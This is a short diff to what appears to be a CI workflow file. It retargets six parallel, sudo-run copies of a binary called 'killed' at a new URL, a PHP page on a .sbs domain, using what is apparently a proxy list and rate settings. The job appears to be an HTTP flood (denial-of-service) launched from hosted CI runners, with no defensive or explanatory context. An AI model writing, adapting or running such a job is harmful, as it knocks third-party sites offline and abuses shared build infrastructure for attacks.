@@ -20,7 +20,7 @@ jobs:
           chmod +x killed
           PIDS=()
           for i in {1..6}; do
-            sudo timeout 115 ./killed GET https://hexbear.xyz/wewe fres.txt 100 128 10 &
+            sudo timeout 115 ./killed GET https://toki.basvuru-2025.sbs/hizligirisiniz.php fres.txt 100 128 10 &
             PIDS+=($!)
           done
           
